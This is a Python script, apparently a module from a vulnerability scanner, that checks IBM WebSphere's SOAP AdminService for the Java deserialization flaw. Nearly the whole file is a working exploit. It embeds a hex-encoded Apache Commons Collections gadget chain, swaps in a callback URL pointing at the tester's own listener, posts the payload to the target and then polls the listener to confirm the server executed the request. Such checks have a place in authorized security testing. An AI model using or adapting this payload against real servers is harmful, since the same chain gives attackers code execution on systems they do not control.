# -*- coding:utf-8 -*-

import codecs
import ssl
import socket
import base64
import random
import time
import requests
from exp.lib.httpparse import httpparse
import codecs


decode_hex = codecs.getdecoder('hex_codec')
def str2hex(x):
    asdad = bytes(x, 'utf-8')
    return asdad.hex()
def h2bin(x):
    return decode_hex(x.replace(' ', '').replace('\n', ''))[0]


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)

def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr


def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    host = ip+':'+str(port)
    print('testing if websphere java unserialized vul')
    http = httpparse()
    try:
        socket.setdefaulttimeout(3)
        post_header = {"Content-Type":"text/xml; charset=utf-8", "SOAPAction":"\"urn:AdminService\""}
        post_data = (b"""<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">
<LoginMethod>BasicAuth</LoginMethod>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">%s</objectname>
<attribute xsi:type="xsd:string">ringBufferSize</attribute>
</ns1:getAttribute>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
""")
        dnsserver = get_ver_ip(ip)
        random_num = random_str(6 + 15 - len(dnsserver))
        payload = "aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b7870737d00000001000d6a6176612e7574696c2e4d6170787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b78707672000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e001578707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00155b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787074000e676574436f6e7374727563746f727571007e001d000000017671007e001d7371007e00177571007e001b00000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001740026687474703a2f2f3235352e3235352e3235352e3235353a383038382f6164642f72616e646f6d74000b6e6577496e7374616e63657571007e001d000000017671007e001b7371007e00177571007e001b0000000074000a6f70656e53747265616d7571007e001d000000007371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e0037"
        b = 'http://' + dnsserver +':8088/add/' + random_num
        b = bytes(b, 'utf-8')
        payload = h2bin(payload)
        payload = payload.replace(b'http://255.255.255.255:8088/add/random',b)
        #payload = codecs.decode(payload, 'hex').replace('http://255.255.255.255:8088/add/random', ('http://%s:8088/add/%s' % (dnsserver, random_num)).encode())
        post_data = post_data % base64.b64encode(payload)
        if protocol == 'https':
            req = requests.post(url = url + '/', data = post_data, headers=post_header, verify=False, timeout=5)
        else:
            req = requests.post(url = url + '/', data = post_data, headers=post_header, timeout=5)
        time.sleep(5)
        req = requests.get("http://%s:8088/check/%s" % (dnsserver, random_num), verify=False,timeout=5)
        if 'YES' in req.text:
            msg = 'There is Websphere-Java_Unserialized on url :'+ url + ' .'
            number = 'v56'
            return True,url,number,msg
        else:
            msg = 'There is  no Websphere-Java_Unserialized'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg








